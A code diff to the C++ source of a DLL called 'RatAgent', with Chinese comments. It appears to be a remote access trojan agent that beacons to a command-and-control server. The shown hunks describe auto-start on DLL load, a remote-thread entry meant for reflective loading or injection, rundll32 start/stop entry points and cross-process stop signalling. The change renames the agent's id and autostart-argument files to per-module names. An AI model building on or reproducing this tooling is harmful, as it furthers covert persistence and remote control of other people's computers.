@@ -10,7 +10,7 @@
 //        远端线程入口用 StartAgent(const char*)：单指针参数，便于 lpParameter 直接传配置串
 //
 // 自启动（本 DLL 的默认行为，加载即生效）：
-//   有 %LOCALAPPDATA%\RatAgent\autostart.args（或 %TEMP%\RatAgent\ 下同名文件）
+//   有 %LOCALAPPDATA%\RatAgent\<module>.autostart.args（或 %TEMP%\RatAgent\ 下同名文件）
 //     → 用文件里的参数串启动（优先级最高）；
 //   没有该文件
 //     → 用内置默认配置启动（beacon 127.0.0.1:8080、轮询 5s），供反射加载/注入这类
@@ -92,7 +92,7 @@ namespace
         a.beacon = true;
         a.sleeptime = 5;
         a.redirect_stdout = true;
-        a.id_path = c2::agent_default_id_path(true);   // %LOCALAPPDATA%\RatAgent\agent.id
+        a.id_path = c2::agent_default_id_path(true);   // %LOCALAPPDATA%\RatAgent\<module>.id
         a.log_path = c2::agent_default_log_path();
     }
 
@@ -125,7 +125,7 @@ namespace
 
     // 停止：同进程直接停；否则按 id（hex 或 id 文件路径）推出事件名，跨进程通知
     //   target 支持 "log=<路径>" 与 "id=<路径>" 修饰，以及：
-    //     空            → 用默认 id 文件（%LOCALAPPDATA%\RatAgent\agent.id）
+    //     空            → 用默认 id 文件（%LOCALAPPDATA%\RatAgent\<module>.id）
     //     32 位 hex     → 直接用它做事件名
     //     其它字符串    → 当作 id 文件路径
     void stop_any(const char* target)
@@ -177,7 +177,7 @@ namespace
     }
 
     // 加载即自启线程：等 DllMain 走完（脱离 loader lock）后解析参数并启动。
-    //   有 autostart.args → 用文件里的参数（优先级最高）
+    //   有 <module>.autostart.args → 用文件里的参数（优先级最高）
     //   没有             → 用内置默认配置
     // 这里的 300ms 延迟同时是显式入口（rundll32 的 Start/Stop、宿主 StartAgent）能
     // "先接管"的窗口：它们由加载方紧接着调用，通常远早于此；若晚于它，默认自启会先占坑
